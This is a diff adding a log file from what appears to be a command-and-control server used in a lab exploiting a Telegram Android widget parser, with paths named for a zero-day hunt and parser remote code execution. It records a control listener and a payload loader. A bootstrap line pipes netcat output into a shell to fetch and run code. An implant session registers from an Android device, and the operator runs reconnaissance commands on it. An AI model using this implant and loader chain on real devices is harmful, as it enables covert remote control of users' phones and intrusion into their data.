@@ -1,0 +1,19 @@
+2026-11-07 23:52:34 control listening on 127.0.0.1:4444
+2026-11-07 23:52:34 loader listening on 127.0.0.1:5555
+2026-11-07 23:52:34 logs: <HOME>/ailocal/Telegram/telegramandroidwidget/lab/qjs_fork_audit/zeroday_hunt_parser/device/logs/device_parser_rce/c2_final_20261107/logs/run-20261107-235234
+2026-11-07 23:52:34 downloads: <HOME>/ailocal/Telegram/telegramandroidwidget/c2/downloads
+2026-11-07 23:52:34 bootstrap: setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
+2026-11-07 23:52:44 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:44 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:44 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:45 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:45 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:45 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:45 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:46 session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 device=XQ-BT52 pid= build=b41af6b56cc4a4b4 from=127.0.0.1
+2026-11-07 23:52:46 session 1 exec [tg-10346-XQ-BT52]: id
+2026-11-07 23:52:46 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:46 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:46 session 1 exec [tg-10346-XQ-BT52]: getprop ro.product.model; getprop ro.build.version.release; id
+2026-11-07 23:52:46 loader: serving 39803 bytes to 127.0.0.1
+2026-11-07 23:52:47 loader: serving 39803 bytes to 127.0.0.1
